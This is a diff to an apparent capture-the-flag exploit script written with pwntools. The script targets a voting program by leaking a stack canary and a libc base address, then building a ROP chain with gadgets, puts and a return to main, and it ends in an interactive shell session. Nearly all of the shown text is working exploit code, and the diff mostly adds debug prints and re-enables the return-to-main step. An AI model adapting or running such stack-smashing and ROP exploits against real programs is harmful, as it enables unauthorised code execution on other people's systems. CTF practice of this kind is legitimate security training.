@@ -51,12 +51,13 @@ def hack_vote_ret(canary, base):
     r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))
 
     # quit voting --> GET libc base
-    pause()
     r.sendlineafter('>', '3')
     # recv the menu, and eat it out
-    r.recv()
+    print('first recv --> ', r.recv())
     recv_str = r.recv().split()
+    print('and then --> ', recv_str)
 
+    libc_base = 0
     libc_base = u64(recv_str[-1] + '\0\0') - 0x201ab0
     print('libc_base --> ', hex(libc_base))
 
@@ -133,18 +134,14 @@ def rop_libc_base(canary, base):
     puts = base + offset_puts
     p += p64(puts)
 
-    '''
     # return to main function
-    pop_rdi = base + 0x11a3
-    p += p64(pop_rdi)
-
     addr_main = base + 0xffb
     p += p64(addr_main)
-    '''
 
     print('pop_rdi for libc_base --> ', hex(pop_rdi))
-    print('libc_start_main libc_base --> ', hex(libc_start_main))
+    print('libc_start_main for libc_base --> ', hex(libc_start_main))
     print('puts for libc_base --> ', hex(puts))
+    print('addr_main for ret main ', hex(addr_main))
     print('ROP for libc_base --> ', p)
     return p
 
@@ -183,6 +180,7 @@ def main():
     hack_vote_ret(canary, base)
 
 main()
+r.interactive()
 r.sendlineafter('>', '3')
 print('final')
 r.close()
